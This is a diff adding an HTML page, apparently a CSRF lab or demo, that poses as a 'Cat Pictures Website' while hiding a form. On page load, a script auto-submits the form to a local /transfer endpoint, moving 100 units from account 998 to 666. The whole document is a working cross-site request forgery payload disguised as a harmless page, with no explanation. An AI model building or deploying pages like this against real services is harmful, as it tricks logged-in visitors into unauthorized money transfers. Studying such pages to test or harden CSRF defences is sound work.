@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <h1>Welcome to the Cat Pictures Website</h1>
+    <form action="localhost:5000/transfer" method="POST">
+      <input type="amount" name="amount" value="100" />
+      <input type="hidden" name="from" value="998" />
+      <input type="hidden" name="to" value="666" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
